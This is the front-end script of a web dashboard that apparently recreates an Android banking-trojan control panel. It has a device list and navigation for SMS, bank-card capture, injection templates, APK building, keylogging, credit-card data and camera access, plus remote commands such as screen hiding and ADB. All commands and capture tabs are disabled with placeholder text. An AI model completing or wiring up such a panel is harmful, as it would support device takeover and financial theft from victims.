'use strict';
const $ = id => document.getElementById(id);
const escapeHTML = s => String(s==null?'':s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
let source=[], displayed=[], activeDevice=null, previewMode=false, statusFilter='all', countryFilter='all';
const moduleLabels={"控制台":"控制台","设备":"设备管理","短信":"短信","通知":"通知","银行卡":"银行卡","注入数据":"注入数据","分组管理":"分组管理","黑名单":"黑名单","应用设置":"应用设置","注入模板":"注入模板","AI制作模板":"AI制作模板","短信通知规则":"短信通知规则","银行检测配置":"银行检测配置","APK构建":"APK构建","用户设置":"用户设置","安全中心":"安全中心","服务器状态":"服务器状态","TURN节点":"TURN节点","Telegram设置":"Telegram设置"};
function toast(message){const t=$('toast');t.textContent=message;t.style.display='block';clearTimeout(window.toastTimeout);window.toastTimeout=setTimeout(()=>t.style.display='none',2500)}
function normalized(d){return {raw:d,name:d.device_name||d.model||'未知设备',uid:d.device_id||String(d.id||''),battery:Number(d.battery)||0,ip:d.ip||'未登记',ver:String(d.android_version||'未知').replace(/^Android\s*/i,''),online:['online','在线','active'].includes(String(d.status||'').toLowerCase()),network:d.network||'未登记',country:d.country||'',last:d.last_online?new Date(d.last_online).toLocaleString('zh-CN',{hour12:false}):'尚无设备心跳',isDemo:!!d.isDemo};}
function makePreview(){const names=['Realme RMX3507','Redmi A5','Realme RMX3943','Realme RMX3990','Samsung SM-A167','Samsung SM-A156','Motorola moto g57 power','AIPLUS AI+ Pulse','OPPO CPH2273','HUAWEI nova'];return Array.from({length:41},(_,i)=>normalized({device_name:names[i%names.length],device_id:'DEMO-'+String(i+1).padStart(4,'0'),model:names[i%names.length],android_version:'Android '+([11,15,16,16,16,15,17,15,13,10][i%10]),battery:[98,42,24,52,36,56,48,69,79,66][i%10],network:'WiFi',ip:'示例地址',country:'示例地区',status:i<27?'online':'offline',isDemo:true}));}
function detailRow(k,v,klass=''){return `<div class="detail"><span class="k">${escapeHTML(k)}</span><span class="v ${klass}">${escapeHTML(v)}</span></div>`}
function filtered(){return source.filter(x=>{
const q=$('search').value.trim().toLowerCase();return (x.name+' '+x.uid+' '+x.ip+' '+x.country).toLowerCase().includes(q)&&(statusFilter==='all'||(statusFilter==='online')===x.online)&&(countryFilter==='all'||x.country===countryFilter);
});}
function summary(){const list=source; $('sum-total').textContent=list.length;$('sum-online').textContent=list.filter(x=>x.online).length;$('sum-offline').textContent=list.filter(x=>!x.online).length;$('sum-access').textContent='—';$('sum-adb').textContent='—';$('sum-ai').textContent='—';}
function render(){const arr=filtered();displayed=arr;summary();$('pageinfo').textContent=`${arr.length?1:0}-${arr.length} / 共 ${arr.length}`;
$('cards').innerHTML=arr.map((d,i)=>`<article class="card ${d.online?'online-first':''} clickable" role="button" tabindex="0" data-idx="${source.indexOf(d)}" title="点击查看设备详情"><div class="line-top"><div class="deviceicon">▯</div><div class="devicehead"><div class="title"><em style="background:${d.online?'#08da80':'#697282'}"></em><span class="device-name">${escapeHTML(d.name)}</span></div><div class="id">${escapeHTML(d.uid)}</div></div><div class="icons">▣ ♢ ⚑ ⇄ ⊘ ▤</div></div><div class="tags"><span class="tag">${escapeHTML(d.network)}</span><span class="tag sim">SIM</span><span class="tag access" title="状态尚未从设备上报">无障碍</span><span class="tag admin" title="管理员状态尚未上报">管理员</span><span class="tag screen">${d.online?'亮屏':'离线'}</span><span class="battery ${d.battery>90?'full':d.battery<35?'low':''}">▰ ${d.battery}%</span></div><div class="details">${detailRow('应用名称:','—')}${detailRow('系统版本:','Android '+d.ver)}${detailRow('IP/地区:',d.ip+(d.country?' '+d.country:''),'ip')}${detailRow('设备归属:','admin','owner')}${detailRow('适配流程:','未配置','faint')}${detailRow('密码类型:','未启用','faint')}${detailRow('数据捕获:','未启用','faint')}${detailRow('银行卡列表:','未启用','faint')}${detailRow('安装时间:','未采集','faint')}${detailRow('最后在线:',d.last)}${detailRow('备注:','点击查看设备详情','remark')}</div></article>`).join('');
$('cards').querySelectorAll('.card').forEach(c=>{const f=()=>openDetail(source[Number(c.dataset.idx)]);c.addEventListener('click',f);c.addEventListener('keydown',e=>{if(e.key==='Enter'){e.preventDefault();f()}})});
if(!arr.length)$('cards').innerHTML='<div id="loading">暂无匹配设备。请检查筛选条件，或点击刷新。</div>';
}
function showListing(){ $('listing').style.display='block';$('detail').style.display='none';$('module').style.display='none'; $('sidebar').style.display='flex';$('main').style.marginLeft='140px';$('main').style.padding='0 7px';document.querySelectorAll('.side button').forEach(b=>b.classList.toggle('active',b.textContent.trim()==='设备'));}
function openDetail(d){activeDevice=d; $('listing').style.display='none';$('module').style.display='none';$('detail').style.display='block';$('dev-name').textContent=d.name;$('sidebar').style.display='none';$('main').style.marginLeft='0';$('main').style.padding='6px 12px';$('detail').querySelector('.topline .battery').textContent=d.battery+'%';$('detail').querySelector('.topline .screen').textContent='设备ID: '+d.uid;}
function openModule(name){if(name==='设备'||name==='设备管理')return showListing();$('listing').style.display='none';$('detail').style.display='none';$('module').style.display='block';$('modtitle').textContent=name;$('moddesc').textContent=['控制台','分组管理','用户设置','安全中心','服务器状态'].includes(name)?'该模块的页面入口已经接入。相关真实数据与操作将在取得适当权限后开放。':'此模块目前仅保留原版导航入口，不提供敏感数据采集或未经授权的操作功能。';document.querySelectorAll('.side button').forEach(b=>b.classList.toggle('active',b.textContent.trim().replace(/^[^\u4e00-\u9fa5]*/,'').trim().startsWith(name)));}
function menu(){document.querySelectorAll('.side button').forEach(b=>b.addEventListener('click',()=>{const s=b.textContent.trim();const label=Object.keys(moduleLabels).find(k=>s.includes(k));if(label)openModule(label);}));}
async function load(){if(previewMode){source=makePreview();$('source-label').textContent='预览布局（41台模拟设备，不属于数据库）';render();return;}
$('source-label').textContent='正在从 Supabase 加载设备';try{const response=await fetch('/api/devices',{credentials:'same-origin'});if(response.status===401){location.assign('/login');return;}const d=await response.json();if(!response.ok||!Array.isArray(d))throw new Error(d.error||'服务响应异常');source=d.map(normalized);$('source-label').textContent='数据库设备记录 · 在线状态尚非实时心跳';render();}catch(e){source=[];render();$('source-label').textContent='读取失败，请检查后端或权限';$('cards').innerHTML='<div id="loading">设备读取失败：'+escapeHTML(e.message)+'</div>';}}
function filterClicked(){statusFilter=statusFilter==='all'?'online':statusFilter==='online'?'offline':'all';document.querySelectorAll('.toolbar button').forEach(b=>{if(b.textContent.includes('数据筛选')){b.textContent='数据筛选 · '+({all:'全部',online:'在线',offline:'离线'}[statusFilter]);b.classList.toggle('activefilter',statusFilter!=='all');}});render();}
$('search').addEventListener('input',render);$('refresh').onclick=load;$('back').onclick=showListing;$('preview').onclick=()=>{previewMode=!previewMode;$('preview').textContent=previewMode?'返回真实数据':'◈ 布局预览';load();};$('logout').onclick=async()=>{await fetch('/api/logout',{method:'POST'});location.assign('/login');};
document.querySelectorAll('.toolbar .tool').forEach(b=>{const t=b.textContent.trim();if(t.includes('数据筛选'))b.onclick=filterClicked;else if(t.includes('国家筛选'))b.onclick=()=>{countryFilter=countryFilter==='all'?(source.find(x=>x.country)?.country||'all'):'all';toast(countryFilter==='all'?'全部国家':'筛选：'+countryFilter);render();};else if(!['⟳ 刷新','◈ 布局预览','退出'].includes(t)&&!b.disabled)b.addEventListener('click',()=>toast('此操作尚未接入实际设备管理服务'));});
$('commands').innerHTML=['隐藏屏幕','锁定屏幕','开启阅读器','阅读器设置','开启ADB模式','开启无障碍','关闭无障碍','无障碍状态','屏幕旋转','系统投屏','ADB投屏','关闭投屏','亮度调节','开启静音','系统更新','投屏设置','同步翻译','文件管理','应用管理','远程协助','重启连接','网络诊断','设备信息','操作日志','进入ADB','重启ADB','无线配对','全屏投屏','运行状态','安全设置','导入权限','设备管理'].map(s=>`<button disabled title="目前没有已授权的设备远程控制通道">${s}</button>`).join('');
$('tabs').innerHTML=['AI分析','密码记录','支付捕获','短信','键盘日志','信用卡数据','摄像/麦克风','相册','文件','应用/注入','通讯录','权限','群发功能'].map((s,i)=>`<button class="tool ${i===0?'on current':''}" data-panel="${escapeHTML(s)}">${s}</button>`).join('');
$('tabs').querySelectorAll('button').forEach(b=>b.addEventListener('click',()=>{ $('tabs').querySelectorAll('button').forEach(x=>x.classList.remove('on','current'));b.classList.add('on','current');const label=b.dataset.panel;document.querySelector('.sectionlabel').textContent=label;document.querySelector('.analysis>div:last-child').textContent=['密码记录','支付捕获','短信','键盘日志','信用卡数据','摄像/麦克风'].includes(label)?'此敏感信息采集功能不可用':'当前设备没有已授权的远程连接数据';}));
$('detail').querySelectorAll('.quick .tool,.analysis .rightactions button').forEach(b=>b.addEventListener('click',()=>toast('尚未接入授权的设备操作服务')));
const toastElement=document.createElement('div');toastElement.id='toast';document.body.appendChild(toastElement);menu();load();
</script></body></html>
